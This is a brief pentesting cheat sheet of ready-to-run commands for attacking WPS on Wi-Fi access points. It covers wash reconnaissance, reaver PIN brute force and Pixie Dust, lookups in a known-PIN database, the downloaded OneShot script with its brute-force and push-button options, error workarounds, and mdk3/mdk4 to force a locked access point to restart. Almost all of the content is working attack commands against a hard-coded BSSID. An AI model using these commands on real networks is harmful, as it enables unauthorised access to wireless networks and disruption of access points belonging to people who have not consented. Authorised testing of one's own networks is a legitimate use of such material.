# WPS Pentesting:



## Give us info on the AP
```
wash -i wlan0mon
wash -i wlan0mon -5 # 5ghz
```


## Attack


### Brute force

```
sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -v
sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -v -c 3 # ADD channel
```

### PixieWPS

```
sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -v
```


### Known pins

```
sudo apt install airgeddon
source /usr/share/airgeddon/known_pins.db
echo ${PINDB["0013F7"]}
```

### Bully

```
sudo apt install -y python3 wpasupplicant iw wget
sudo apt install -y pixiewps
cd ~
mkdir oneshot && cd oneshot
wget https://raw.githubusercontent.com/drygdryg/OneShot/master/oneshot.py
wget https://raw.githubusercontent.com/drygdryg/OneShot/master/vulnwsc.txt
```

```
python3 oneshot.py -b <bssid> wlan0 -K
python3 oneshot.py -b <bssid> wlan0 -F -d 5         # delay 5
python3 oneshot.py -b <bssid> wlan0 -b              # online brute force
python3 oneshot.py -b <bssid> wlan0 -p 12345678     # custom pin
python3 oneshot.py -b <bssid> wlan0 --pbc           # wps button
```



### Errors

```
[!] WPS transaction failed (code: 0x03), re-trying last pin
```
- Restart reaver without any options and continue session.
- Try another wireless card

```
[+] Sending identity response
[+] Received identity request
```
- Try new weireless card

### WPS LOCKED?
Use mdk3 or mdk4 to trigger restart. 